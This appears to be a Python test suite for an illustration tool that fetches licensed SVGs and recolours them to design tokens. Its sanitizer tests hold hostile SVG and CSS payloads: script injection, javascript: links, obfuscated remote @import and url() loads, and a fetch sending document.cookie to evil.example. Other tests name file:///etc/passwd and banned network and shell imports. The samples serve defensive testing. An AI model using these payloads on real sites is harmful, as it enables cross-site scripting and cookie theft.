#!/usr/bin/env python3
"""Tests for illustrate.py. Standard library only, no network: API responses are canned in the shapes the live
APIs returned on 2026-09-28, and every SVG is a small fixture written here (no third-party art in the repo).

    python3 skills/opendesigner-illustrate/scripts/test_illustrate.py
"""
import contextlib, io, json, os, re, sys, tempfile, unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import illustrate as il  # noqa: E402

REPO = HERE.parents[2]
EXAMPLE_CSS = REPO / "examples" / "consumer-playful" / "build" / "css" / "tokens.css"
EXAMPLE_JSON = REPO / "examples" / "consumer-playful" / "tokens" / "primitives.tokens.json"

# An unDraw-shaped scene: one accent, gray neutrals, a skin tone, a second hue, a <style> class and a style attribute.
SCENE = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
<defs><style>.cls-1{fill:#e6e6e6;}</style><linearGradient id="g"><stop offset="0" stop-color="#6c63ff"/></linearGradient></defs>
<rect class="cls-1" width="200" height="100"/>
<path d="M10 10 L90 10 L90 90 L10 90 Z M20 20 L80 20 L80 80 Z" fill="#6c63ff"/>
<path d="M100 10 L190 10 L190 90 Z" fill="#6C63FF" stroke="#3f3d56"/>
<circle cx="50" cy="50" r="10" fill="#ffb8b8"/>
<rect x="60" y="60" width="20" height="10" fill="#ffffff"/>
<ellipse cx="150" cy="50" rx="10" ry="5" style="fill:#f9a826;stroke:none"/>
<path d="M0 0 L5 5" fill="url(#g)"/>
<path d="M1 1 L2 2 L3 1 Z"/>
</svg>"""

EVIL = """<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="40" height="20" onload="alert(1)">
<script>alert(1)</script><foreignObject><div>x</div></foreignObject>
<style>@import url(https://evil.example/x.css); .a{fill:url(https://evil.example/p.svg#x)}</style>
<image xlink:href="https://evil.example/track.png"/><a href="javascript:alert(1)"><rect width="5" height="5" fill="red"/></a>
<use href="#ok"/><rect id="ok" width="1" height="1"/></svg>"""


def run(argv):
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        il.main(argv)
    return buf.getvalue()


class ColorMath(unittest.TestCase):
    def test_round_trip_and_contrast(self):
        for hx in ("#6c63ff", "#ff5a36", "#3f3d56", "#ffffff", "#000000", "#1f033c"):
            self.assertEqual(il.oklch_to_hex(*il.hex_to_oklch(hx)), hx)
        self.assertAlmostEqual(il.contrast("#ffffff", "#000000"), 21, places=3)

    def test_normalize_tokens(self):
        self.assertEqual(il.norm_color("#ABC"), "#aabbcc")
        self.assertEqual(il.norm_color("rgb(255, 0, 0)"), "#ff0000")
        self.assertEqual(il.norm_color("rgba(0 0 255 / 50%)"), "#0000ff")
        self.assertEqual(il.norm_color("White"), "#ffffff")
        for tok in ("none", "currentColor", "url(#g)", "inherit"):
            self.assertIsNone(il.norm_color(tok))

    def test_classify_keeps_skin_not_brand_orange(self):
        self.assertEqual(il.classify("#e6e6e6"), "neutral")
        self.assertEqual(il.classify("#3f3d56"), "neutral")
        self.assertEqual(il.classify("#ffb8b8"), "skin")
        self.assertEqual(il.classify("#a0616a"), "skin")
        self.assertEqual(il.classify("#6c63ff"), "chroma")
        self.assertEqual(il.classify("#ff5a36"), "chroma")   # saturated brand orange is not skin
        self.assertEqual(il.classify("#ffb8b8", keep_skin=False), "chroma")


class Safety(unittest.TestCase):
    def test_strips_code_and_remote_loads(self):
        root, notes = il.sanitize(EVIL)
        out = il.serialize(root)
        for bad in ("<script", "foreignObject", "onload", "evil.example", "javascript:"):
            self.assertNotIn(bad, out)
        self.assertIn('href="#ok"', out)          # local references survive
        self.assertIn('viewBox="0 0 40 20"', out)  # added from width and height
        self.assertTrue(any("removed <script>" in n for n in notes))

    def test_refuses_entities_and_non_svg(self):
        with self.assertRaises(ValueError):
            il.sanitize('<!DOCTYPE svg [<!ENTITY a "aaaa">]><svg xmlns="http://www.w3.org/2000/svg">&a;</svg>'.replace("]>", "]><!ENTITY b 'x'>"))
        with self.assertRaises(ValueError):
            il.sanitize("<html></html>")


class Hostile(unittest.TestCase):
    """Payloads from the independent review (2026-09-28): each one survived the first, deny-list sanitizer."""
    PAYLOADS = {
        "uppercase script": '<SCRIPT>alert(1)</SCRIPT>',
        "lowercase foreignobject": '<foreignobject><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"/></foreignobject>',
        "uppercase href": '<image HREF="https://evil.example/i.png"/>',
        "html img": '<img xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/i.png"/>',
        "meta refresh": '<meta xmlns="http://www.w3.org/1999/xhtml" http-equiv="refresh" content="0;url=https://evil.example/"/>',
        "animate href": '<a><animate attributeName="href" values="java&#9;script:alert(1)"/><text>click</text></a>',
        "set href": '<image><set attributeName="href" to="https://evil.example/p.png"/></image>',
        "css import caps": '<style>@IMPORT "https://evil.example/x.css";</style>',
        "css URL caps": '<style>.a{fill:URL(https://evil.example/p.svg#x)}</style>',
        "css https caps": '<style>.a{fill:url(HTTPS://evil.example/p.svg#x)}</style>',
        "css import no semicolon": '<style>@import "https://evil.example/x.css"</style>',
        "css escaped import": '<style>@\\69mport "https://evil.example/x.css";</style>',
        "css escaped url": '<style>.a{background:\\75 rl(https://evil.example/p.png)}</style>',
        "css protocol-relative": '<style>.a{fill:url(/\\/evil.example/p.svg)}</style>',
        "css image-set": '<style>.a{background:image-set("https://evil.example/p.png" 1x)}</style>',
        "css after child": '<style><x/>.a{fill:url(https://evil.example/p.svg)}</style>',
        "style attr url": '<rect style="fill:url(https://evil.example/p.svg#x)"/>',
        "data html href": '<use href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"/>',
        "namespaced script": '<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>',
    }

    def test_nothing_hostile_survives(self):
        for name, body in self.PAYLOADS.items():
            with self.subTest(name):
                svg = f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">{body}<rect width="1" height="1" fill="#ff0000"/></svg>'
                out = il.serialize(il.sanitize(svg)[0]).lower()
                for bad in ("script", "evil.example", "iframe", "<img", "<meta", "animate", "<set", "@import", "image-set", "\\"):
                    self.assertNotIn(bad, out, f"{name}: {bad!r} survived")

    def test_jsx_text_cannot_run(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "x.svg"
            f.write_text('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><desc>{fetch("https://evil.example/?c="+document.cookie)}</desc><rect width="5" height="5" fill="#6c63ff"/></svg>')
            run(["--dir", tmp, "add", str(f), "--source", "other", "--licence", "CC0", "--name", "x"])
            run(["--dir", tmp, "recolor", "x", "--tokens", str(EXAMPLE_CSS), "--variants", "themed"])
            run(["--dir", tmp, "apply", "x", "--to", str(Path(tmp) / "out"), "--as", "react"])
            tsx = (Path(tmp) / "out" / "XIllustration.tsx").read_text()
            self.assertIn("{'{'}fetch(", tsx)
            self.assertNotIn("<desc>{fetch", tsx)

    def test_only_https_is_offered(self):
        with self.assertRaises(ValueError):
            il.fetch_line("file:///etc/passwd", "x.svg")
        self.assertIn('"https://a.example/x.svg"', il.fetch_line("https://a.example/x.svg", "x.svg"))

    def test_network_stays_in_one_https_function(self):
        # the owner allowed this skill the network (2026-09-28), confined to http_get: HTTPS only, 3 MB cap
        src = (HERE / "illustrate.py").read_text()
        self.assertEqual(src.count("urlopen("), 1)
        self.assertIn("def http_get(", src.split("urlopen(")[0].rsplit("\ndef ", 1)[-1].join(["\ndef ", ""]))
        for bad in ("import socket", "http.client", "import requests", "import httpx", "subprocess", "os.system"):
            self.assertNotIn(bad, src)
        with tempfile.TemporaryDirectory() as tmp:
            for url in ("http://a.example/x.svg", "file:///etc/passwd", "ftp://a.example/x"):
                with self.assertRaises(ValueError):
                    il.http_get(url, Path(tmp) / "x")

    def test_http_get_refuses_downgrade_and_oversize(self):
        class Resp:
            def __init__(self, url, body): self.url, self.body = url, body
            def geturl(self): return self.url
            def read(self, n): return self.body[:n]
            def __enter__(self): return self
            def __exit__(self, *a): return False
        with tempfile.TemporaryDirectory() as tmp:
            dest = Path(tmp) / "x.svg"
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("http://a.example/x.svg", b"<svg/>")):
                with self.assertRaises(ValueError):
                    il.http_get("https://a.example/x.svg", dest)
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("https://a.example/x.svg", b"x" * (il.MAX_BYTES + 5))):
                with self.assertRaises(ValueError):
                    il.http_get("https://a.example/x.svg", dest)
            self.assertFalse(dest.exists())
            with mock.patch.object(il.urllib.request, "urlopen", return_value=Resp("https://a.example/x.svg", b"<svg/>")):
                il.http_get("https://a.example/x.svg", dest)
            self.assertEqual(dest.read_bytes(), b"<svg/>")


class Recolor(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.pal = il.load_palette(tokens=EXAMPLE_CSS)

    def test_palette_from_css_and_json_agree(self):
        pal_json = il.load_palette(tokens=EXAMPLE_JSON)
        self.assertEqual(self.pal["prefix"], "--ds-color-")
        for ramp in ("neutral", "accent", "accent2"):
            self.assertEqual(len(self.pal["light"][ramp]), 12)
            self.assertEqual(self.pal["light"][ramp], pal_json["light"][ramp])
            self.assertEqual(self.pal["dark"][ramp], pal_json["dark"][ramp])

    def test_seed_palette_without_tokens(self):
        pal = il.load_palette(accent="#2563eb")
        self.assertEqual(sorted(pal["light"]), ["accent", "neutral"])
        self.assertEqual(pal["light"]["accent"][9], "#2563eb")
        self.assertGreater(il.hex_to_oklch(pal["light"]["neutral"][1])[0], il.hex_to_oklch(pal["light"]["neutral"][12])[0])
        self.assertLess(il.hex_to_oklch(pal["dark"]["neutral"][1])[0], il.hex_to_oklch(pal["dark"]["neutral"][12])[0])

    def test_census_reads_every_place_color_lives(self):
        root, _ = il.sanitize(SCENE)
        w, implicit = il.census(root)
        for hx in ("#e6e6e6", "#6c63ff", "#3f3d56", "#ffb8b8", "#f9a826"):
            self.assertIn(hx, w)
        self.assertGreater(implicit, 0)                  # the last path has no fill: it paints black
        self.assertGreater(w["#6c63ff"], w["#ffb8b8"])   # long path data weighs more than a small circle

    def test_mapping_roles(self):
        root, _ = il.sanitize(SCENE)
        m = il.plan_mapping(il.census(root)[0], self.pal)
        self.assertEqual(m["#6c63ff"][0], "accent")      # the heaviest hue takes the brand accent
        self.assertEqual(m["#f9a826"][0], "accent2")
        self.assertEqual(m["#e6e6e6"][0], "neutral")
        self.assertEqual(m["#ffb8b8"], ("keep", "#ffb8b8"))
        self.assertGreater(m["#3f3d56"][1], 9)           # dark ink lands on a dark step
        self.assertLess(m["#e6e6e6"][1], 7)              # pale fill lands on a pale step
        forced = il.plan_mapping(il.census(root)[0], self.pal, overrides={"#6c63ff": "accent3-9", "#f9a826": "#123456"})
        self.assertEqual(forced["#6c63ff"], ("accent3", 9))
        self.assertEqual(forced["#f9a826"], ("keep", "#123456"))

    def test_variants_use_only_palette_colors(self):
        out, mapping, weights, css = il.recolor_svg(SCENE, self.pal)
        self.assertEqual(set(out), set(il.VARIANTS))
        light = {hx for steps in self.pal["light"].values() for hx in steps.values()}
        dark = {hx for steps in self.pal["dark"].values() for hx in steps.values()}
        for v, allowed in (("light", light), ("dark", dark), ("tint", light), ("swap", light), ("mono", light)):
            w, _ = il.census(il.sanitize(out[v])[0])
            extra = {hx for hx in w if hx not in allowed} - ({"#ffb8b8"} if v != "mono" else set())
            self.assertFalse(extra, f"{v} has off-palette colors {extra}")
        self.assertNotIn("#6c63ff", out["light"].lower())
        mono_w, _ = il.census(il.sanitize(out["mono"])[0])
        self.assertTrue(all(il.classify(hx, keep_skin=False) == "neutral" for hx in mono_w))
        self.assertIn('stop-color', out["light"])      # gradients are recolored too

    def test_dark_lifts_the_palest_neutrals_off_the_page(self):
        out, mapping, _, _ = il.recolor_svg(SCENE, self.pal, variants=("dark",))
        step = mapping["#ffffff"][1]
        self.assertLessEqual(step, 3)
        self.assertIn(self.pal["dark"]["neutral"][step + 2], out["dark"])
        self.assertNotIn(self.pal["dark"]["neutral"][1] + ";", out["dark"])

    def test_themed_variant_follows_the_theme(self):
        out, mapping, _, css = il.recolor_svg(SCENE, self.pal, variants=("themed",))
        svg = out["themed"]
        self.assertIn("var(--od-illus-accent-", svg)
        self.assertNotIn(' fill="var(', svg)          # var() only inside style, where browsers accept it
        self.assertIn('--od-illus-accent-%d: var(--ds-color-accent-light-%d)' % ((mapping["#6c63ff"][1],) * 2), css)
        self.assertIn('--ds-color-accent-dark-', css)
        self.assertIn('prefers-color-scheme: dark', css)
        self.assertIn(".cls-1{fill:var(--od-illus-neutral-", svg)

    def test_gradient_ids_that_look_like_hex_are_kept(self):
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><defs><linearGradient id="face"><stop stop-color="#6c63ff"/></linearGradient></defs><rect width="9" height="9" fill="url(#face)"/><rect width="2" height="2" style="fill:url(#face)"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        for v in ("light", "themed"):
            self.assertEqual(out[v].count("url(#face)"), 2, v)

    def test_transparency_is_kept(self):
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><ellipse rx="5" ry="1" fill="rgba(0,0,0,0.2)"/><rect width="2" height="2" fill="#00000080"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        dark_ink = self.pal["light"]["neutral"][12]
        self.assertIn(dark_ink + "33", out["light"])
        self.assertIn(dark_ink + "80", out["light"])
        self.assertIn("color-mix(in srgb, var(--od-illus-neutral-12", out["themed"])

    def test_themed_keeps_the_cascade(self):
        # a class rule beats a fill attribute; the themed variant must draw the same shape the same way
        svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>.a{fill:#f9a826}</style><path class="a" d="M0 0h9v9z" fill="#000"/></svg>'
        out, *_ = il.recolor_svg(svg, self.pal)
        self.assertIn(":where(.odp1){fill:var(--od-illus-neutral-12", out["themed"])
        self.assertNotIn('style="fill', out["themed"])

    def test_style_metrics(self):
        m = il.style_metrics(SCENE)
        self.assertEqual(m["aspect"], 2.0)
        self.assertEqual(m["text"], 0)
        self.assertGreaterEqual(m["hues"], 2)


class Licences(unittest.TestCase):
    def setUp(self):
        self.sources = {s["id"]: s for s in il.load_json(il.SOURCES)["sources"]}

    def v(self, **c):
        return il.licence_verdict({"source": "openverse", **c}, self.sources)[0]

    def test_item_licences(self):
        self.assertEqual(self.v(licence="CC0"), "ok")
        self.assertEqual(self.v(licence="Public domain mark"), "ok")
        self.assertEqual(self.v(licence="CC BY 4.0"), "attribution")
        self.assertEqual(self.v(licence="CC BY-SA 3.0"), "attribution")
        self.assertEqual(self.v(licence="CC BY-NC 4.0"), "blocked")
        self.assertEqual(self.v(licence="CC BY-ND 4.0"), "blocked")
        self.assertEqual(self.v(licence=""), "blocked")

    def test_words_are_not_mistaken_for_licence_codes(self):
        # "LICENCE" contains "NC" and "SA" could hide in words; only whole codes count
        self.assertEqual(il.licence_verdict({"source": "lukaszadam", "licence": "CC0 (site: 'CC0 licence (MIT licence)')"}, self.sources)[0], "ok")

    def test_source_terms(self):
        lv = lambda sid, **c: il.licence_verdict({"source": sid, "licence": self.sources[sid]["licence"], **c}, self.sources)[0]
        self.assertEqual(lv("undraw"), "ok")
        self.assertEqual(lv("storyset"), "attribution")
        self.assertEqual(lv("iradesign"), "attribution")
        self.assertEqual(lv("iconify", licence_spdx="MIT"), "ok")
        self.assertEqual(lv("iconify", licence_spdx="CC-BY-4.0"), "attribution")
        self.assertEqual(lv("iconify", licence_spdx="GPL-3.0"), "blocked")

    def test_manual_sources_are_never_automated(self):
        for sid in ("undraw", "storyset", "manypixels", "blush", "svgrepo"):
            self.assertEqual(self.sources[sid]["access"], "manual", sid)
            self.assertNotIn(sid, il.CONNECTORS)
        for s in self.sources.values():
            self.assertIn("restrictions", s)
            if s["id"] != "other":
                self.assertTrue(s["licence_url"].startswith("https://"), s["id"])


class Directory(unittest.TestCase):
    def setUp(self):
        self.data = il.load_json(il.SOURCES)

    def test_every_source_is_complete(self):
        ids = [s["id"] for s in self.data["sources"]]
        self.assertEqual(len(ids), len(set(ids)))
        for s in self.data["sources"]:
            with self.subTest(s["id"]):
                self.assertIn(s["access"], il.ACCESS)
                self.assertIn(s.get("attribution"), il.CREDIT)
                if s["id"] == "other":
                    continue
                for k in ("name", "url", "licence", "licence_url", "style", "kind", "formats", "evidence"):
                    self.assertTrue(s.get(k), f"missing {k}")
                self.assertTrue(set(s["kind"]) <= set(il.KINDS), s["kind"])
                self.assertTrue(s["licence_url"].startswith("https://"))
                if s["access"] == "api":
                    self.assertTrue(s["id"] in il.CONNECTORS or s["id"] in il.PHOTO_CONNECTORS, s["id"])
                else:
                    self.assertTrue(s.get("search_url"), "people need a link to start from")
                    self.assertTrue(s.get("navigate"), "steps for the agent or the person")
        for e in self.data["excluded"]:
            self.assertTrue(e["why"])

    def test_directory_markdown_is_current(self):
        md = il.REF / "directory.md"
        self.assertEqual(md.read_text(encoding="utf-8"), il.directory_markdown(self.data) + "\n",
                         "edit synthesis/illustration-sources.json, then run: python3 tools/build_data.py")

    def test_directory_page_and_filters(self):
        page = il.directory_html(self.data)
        self.assertIn("Illustration directory", page)
        self.assertNotIn("</script><", page.split('id="data">', 1)[1].split("</script>", 1)[0] + "x")  # data cannot close its tag
        with tempfile.TemporaryDirectory() as tmp:
            run(["--dir", tmp, "directory"])
            self.assertTrue((Path(tmp) / "directory.html").exists())
        out = run(["sources", "--kind", "people", "--no-credit", "--q", "team"])
        self.assertIn("openpeeps", out)
        self.assertIn("https://www.openpeeps.com", out)
        self.assertNotIn("storyset", out)             # credit required
        self.assertIn("undraw.co/search/team", run(["sources", "--q", "team"]))

    def test_no_tier_that_forbids_changes_can_be_recolored(self):
        sources = {s["id"]: s for s in self.data["sources"]}
        self.assertEqual(il.licence_verdict({"source": "icons8", "licence": sources["icons8"]["licence"]}, sources)[0], "blocked")


OPENVERSE = {"result_count": 1, "results": [{"id": "abc", "title": "Rocket launch", "url": "https://upload.wikimedia.org/r.svg",
             "foreign_landing_url": "https://commons.wikimedia.org/wiki/File:R.svg", "creator": "Ann", "creator_url": "",
             "license": "by-sa", "license_version": "4.0", "license_url": "https://creativecommons.org/licenses/by-sa/4.0/",
             "provider": "wikimedia", "filetype": "svg", "tags": [{"name": "space"}], "attribution": "\"Rocket launch\" by Ann is licensed under CC BY-SA 4.0.",
             "thumbnail": "https://api.openverse.org/v1/images/abc/thumb/"}]}
COMMONS = {"query": {"pages": [{"pageid": 7, "title": "File:Empty_inbox.svg", "imageinfo": [{"url": "https://upload.wikimedia.org/e.svg",
           "descriptionurl": "https://commons.wikimedia.org/wiki/File:Empty_inbox.svg", "mime": "image/svg+xml",
           "extmetadata": {"LicenseShortName": {"value": "CC0"}, "Artist": {"value": "<a href='x'>Bo</a>"}, "AttributionRequired": {"value": "false"}}}]},
           {"pageid": 8, "title": "File:Photo.jpg", "imageinfo": [{"mime": "image/jpeg"}]}]}}
ICONIFY = {"icons": ["fluent-emoji-flat:rocket", "mdi:rocket"], "collections": {
           "fluent-emoji-flat": {"name": "Fluent Emoji Flat", "author": {"name": "Microsoft"}, "license": {"title": "MIT", "spdx": "MIT"}},
           "mdi": {"name": "Material Design Icons", "license": {"title": "Apache 2.0", "spdx": "Apache-2.0"}}}}
LISTING = '<img src="/images/free-illustrations/rocket_launch.svg"><img src="/images/free-illustrations/coffee-cup.svg">'


class Connectors(unittest.TestCase):
    def setUp(self):
        self.sources = {s["id"]: s for s in il.load_json(il.SOURCES)["sources"]}

    def req(self, **kw):
        return {"url": "https://x/?tags=team", "words": [], **kw}

    def test_openverse_shape(self):
        c = il.parse_openverse(json.dumps(OPENVERSE), self.req(), self.sources["openverse"], 10)[0]
        self.assertEqual((c["id"], c["licence"], c["format"]), ("openverse:abc", "CC BY-SA 4.0", "svg"))
        self.assertIn("Ann", c["attribution"])

    def test_commons_shape_keeps_only_svg(self):
        items = il.parse_commons(json.dumps(COMMONS), self.req(), self.sources["commons"], 10)
        self.assertEqual(len(items), 1)
        self.assertEqual((items[0]["title"], items[0]["licence"], items[0]["author"]), ("Empty inbox", "CC0", "Bo"))

    def test_iconify_shape(self):
        items = il.parse_iconify(json.dumps(ICONIFY), self.req(), self.sources["iconify"], 10)
        self.assertEqual(items[0]["download"], "https://api.iconify.design/fluent-emoji-flat/rocket.svg")
        self.assertEqual(items[0]["licence_spdx"], "MIT")

    def test_listing_keeps_matches_only(self):
        items = il.parse_listing(LISTING, self.req(words=["rocket", "space"]), self.sources["lukaszadam"], 10)
        self.assertEqual([c["title"] for c in items], ["rocket launch"])
        self.assertEqual(items[0]["download"], "https://lukaszadam.com/images/free-illustrations/rocket_launch.svg")

    def test_cocomaterial_shape(self):
        body = json.dumps({"count": 1, "results": [{"id": "7", "name": "Team", "tags": "team,work", "svg": "https://cocomaterial.com/media/t.svg",
                                                    "coloredSvg": "None"}]})
        items = il.parse_cocomaterial(body, self.req(), self.sources["cocomaterial"], 10)
        self.assertEqual([(c["id"], c["licence"]) for c in items], [("cocomaterial:7", "CC0")])

    def test_requests_are_https_and_bounded(self):
        for sid, (build, _, _) in il.CONNECTORS.items():
            urls = build(self.sources[sid], ["rocket launch", "rocket"], ["rocket", "launch"], ["start"], 20)
            self.assertTrue(1 <= len(urls) <= 3, sid)
            self.assertTrue(all(u.startswith("https://") for u in urls), sid)


def fulfil_search(d, bodies):
    """Stand in for the agent: save a canned response for every request the search printed."""
    for r in json.loads(Path(d, "requests.json").read_text())["requests"]:
        Path(r["save_as"]).write_text(bodies.get(r["source"], '{"results": []}' if r["save_as"].endswith(".json") else ""))


def ov(i, title, lic):
    return {"id": i, "title": title, "url": f"https://x/{i}.svg", "foreign_landing_url": f"https://x/{i}", "license": lic,
            "license_version": "4.0", "filetype": "svg", "creator": "Ann"}


class Workflow(unittest.TestCase):
    """search -> rank -> fetch -> recolor -> apply -> ledger in a temporary project, in --offline mode: the test stands
    in for the agent, saving the responses search and fetch ask for, so nothing touches the network."""

    def test_end_to_end(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = str(Path(tmp) / "opendesigner" / "illustrations")
            out = run(["--dir", d, "search", "rocket launch", "--slot", "onboarding", "--offline"])
            self.assertIn("with your own tools", out)             # --offline only prints what to fetch
            self.assertIn('curl -sL', out)
            self.assertIn("undraw.co/search/rocket", out)        # the manual source is offered, not fetched
            self.assertFalse(Path(d, "candidates.json").exists())
            commons = {"query": {"pages": [
                {"pageid": 2, "title": "File:Rocket launch placard diagram.svg", "imageinfo": [{"url": "https://x/2.svg", "descriptionurl": "https://x/2",
                 "mime": "image/svg+xml", "extmetadata": {"LicenseShortName": {"value": "CC0"}}}]},
                {"pageid": 4, "title": "File:Coffee.svg", "imageinfo": [{"url": "https://x/4.svg", "descriptionurl": "https://x/4",
                 "mime": "image/svg+xml", "extmetadata": {"LicenseShortName": {"value": "CC0"}}}]}]}}
            fulfil_search(d, {"openverse": json.dumps({"results": [ov("1", "Rocket launch", "cc0"), ov("3", "Rocket launch", "by-nc")]}),
                              "commons": json.dumps(commons)})
            out = run(["--dir", d, "search", "rocket launch", "--slot", "onboarding"])
            self.assertIn("4 candidates", out)
            out = run(["--dir", d, "rank"])
            ranked = [l.split()[2] for l in out.splitlines() if l[:1].strip() or l.startswith(" ")][:3]
            self.assertEqual(ranked[0], "openverse:1")
            self.assertNotIn("openverse:3", out)                # non-commercial is hidden
            out = run(["--dir", d, "fetch", "openverse:1", "openverse:3", "--name", "launch", "--offline"])
            self.assertIn("skip openverse:3: non-commercial", out)
            self.assertIn('"https://x/1.svg"', out)              # step one: the download to make
            Path(d, "downloads", "openverse-1.svg").write_text(SCENE)
            out = run(["--dir", d, "fetch", "openverse:1", "--name", "launch"])
            self.assertIn("fetched launch", out)
            run(["--dir", d, "fetch", "commons:4", "--offline"])
            Path(d, "downloads", "commons-4.svg").write_text("<svg xmlns='http://www.w3.org/2000/svg'>&nbsp;</svg>")
            self.assertIn("not a usable SVG", run(["--dir", d, "fetch", "commons:4"]))
            out = run(["--dir", d, "search", "coffee", "--offline"])  # a new search starts over: old responses are cleared
            self.assertFalse(any(Path(d, "responses").iterdir()))
            out = run(["--dir", d, "recolor", "launch", "--tokens", str(EXAMPLE_CSS)])
            self.assertIn("6 variants", out)
            app = Path(tmp) / "app"
            out = run(["--dir", d, "apply", "launch", "--to", str(app / "components"), "--as", "react", "--slot", "onboarding"])
            tsx = (app / "components" / "LaunchIllustration.tsx").read_text()
            self.assertIn("export function LaunchIllustration", tsx)
            self.assertIn(":where(.il-launch) .il-launch-cls-1{", tsx)   # scoped with no added specificity
            self.assertIn("<style>{`", tsx)                                         # CSS in a template literal
            self.assertIn('className="il-launch-cls-1"', tsx)
            self.assertIn('aria-hidden="true"', tsx)
            self.assertIn("stop-color:var(--od-illus-accent-", tsx)
            self.assertTrue((app / "components" / "launch.illustration.css").exists())
            out = run(["--dir", d, "apply", "launch", "--to", str(app / "img"), "--variant", "light", "--label", "A rocket taking off"])
            svg = (app / "img" / "launch.svg").read_text()
            self.assertIn('role="img"', svg)
            self.assertIn('aria-label="A rocket taking off"', svg)
            self.assertNotIn(' width="', svg.split(">")[0])
            led = json.loads(Path(d, "ledger.json").read_text())
            self.assertEqual(led["style"]["source"], "openverse")
            self.assertEqual(led["items"][0]["status"], "chosen")
            credits = Path(d, "ATTRIBUTION.md").read_text()
            self.assertIn("launch (onboarding)", credits)
            self.assertIn("CC0", credits)
            out = run(["--dir", d, "rank"])
            self.assertIn("Style locked to openverse", out)
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit) as ex:
                il.main(["--dir", d, "check", str(app / "img" / "launch.svg"), "--tokens", str(EXAMPLE_CSS)])
            self.assertEqual(ex.exception.code, 0)
            self.assertTrue(buf.getvalue().startswith("ok"), buf.getvalue())

    def test_same_title_never_overwrites(self):
        with tempfile.TemporaryDirectory() as tmp:
            items = [{"id": f"openverse:{i}", "source": "openverse", "title": "Lost", "tags": [], "licence": "CC BY 4.0",
                      "author": who, "format": "svg", "download": f"https://x/{i}.svg", "page": f"https://x/{i}"} for i, who in ((1, "Alice"), (2, "Bob"))]
            Path(tmp).mkdir(exist_ok=True)
            il.Project(tmp).save(il.Project(tmp).cand, {"items": items})
            for i in (1, 2):
                Path(tmp, "downloads").mkdir(exist_ok=True)
                Path(tmp, "downloads", f"openverse-{i}.svg").write_text(SCENE)
            run(["--dir", tmp, "fetch", "openverse:1"])
            run(["--dir", tmp, "fetch", "openverse:2"])
            run(["--dir", tmp, "fetch", "openverse:1"])   # fetching again reuses its own row
            led = json.loads(Path(tmp, "ledger.json").read_text())["items"]
            self.assertEqual(sorted((e["name"], e["author"]) for e in led), [("lost", "Alice"), ("lost-2", "Bob")])

    def test_add_needs_a_licence_for_other(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "mine.svg"
            f.write_text(SCENE)
            with self.assertRaises(SystemExit):
                run(["--dir", tmp, "add", str(f), "--source", "other"])
            out = run(["--dir", tmp, "add", str(f), "--source", "undraw", "--url", "https://undraw.co/illustrations", "--title", "Launch day"])
            self.assertIn("added launch-day (ok", out)
            out = run(["--dir", tmp, "add", str(f), "--source", "other", "--licence", "Commissioned; we own copyright", "--name", "hero"])
            self.assertIn("added hero", out)

    def test_non_svg_is_kept_as_is_with_credits(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "confetti.json"
            f.write_text('{"v":"5.7.4","layers":[]}')
            out = run(["--dir", tmp, "add", str(f), "--source", "lottiefiles", "--url", "https://lottiefiles.com/free-animation/confetti"])
            self.assertIn("kept as-is", out)
            self.assertIn("cannot be recolored", run(["--dir", tmp, "recolor", "confetti", "--tokens", str(EXAMPLE_CSS)]))
            run(["--dir", tmp, "apply", "confetti", "--to", str(Path(tmp) / "app"), "--slot", "success"])
            self.assertTrue((Path(tmp) / "app" / "confetti.json").exists())
            self.assertIn("confetti (success)", Path(tmp, "ATTRIBUTION.md").read_text())
            bad = Path(tmp) / "x.exe"
            bad.write_text("x")
            with self.assertRaises(SystemExit):
                run(["--dir", tmp, "add", str(bad), "--source", "other", "--licence", "CC0"])

    def test_check_flags_text_and_off_palette(self):
        with tempfile.TemporaryDirectory() as tmp:
            f = Path(tmp) / "t.svg"
            f.write_text('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text fill="#123456">Hi</text></svg>')
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf), self.assertRaises(SystemExit):
                il.main(["check", str(f), "--tokens", str(EXAMPLE_CSS)])
            self.assertIn("<text>", buf.getvalue())
            self.assertIn("not in the palette", buf.getvalue())


JPEG = b"\xff\xd8\xff\xe0" + b"\x00" * 64


class Photos(unittest.TestCase):
    """Stock photos for the research step: screened for AI images and brand marks, licensed, looked at, never captioned 'AI'."""

    def setUp(self):
        self.sources = {s["id"]: s for s in il.load_json(il.SOURCES)["sources"]}

    def test_sources(self):
        self.assertEqual(self.sources["unsplash"]["access"], "manual")      # robots blocks ClaudeBot; the API asks for hotlinks
        self.assertEqual(self.sources["pexels"]["api"]["key_env"], "PEXELS_API_KEY")
        for sid in ("openverse", "commons", "unsplash", "pexels"):
            self.assertIn("photos", self.sources[sid]["kind"])
        self.assertFalse(self.sources["pexels"].get("default"))             # never part of the illustration search
        self.assertEqual(il.licence_verdict({"source": "unsplash", "licence": self.sources["unsplash"]["licence"]}, self.sources)[0], "ok")

    def test_screen(self):
        rej, _, _ = il.screen_photo({"title": "Midjourney: warehouse", "tags": []})
        self.assertTrue(any("AI image tool" in r for r in rej))
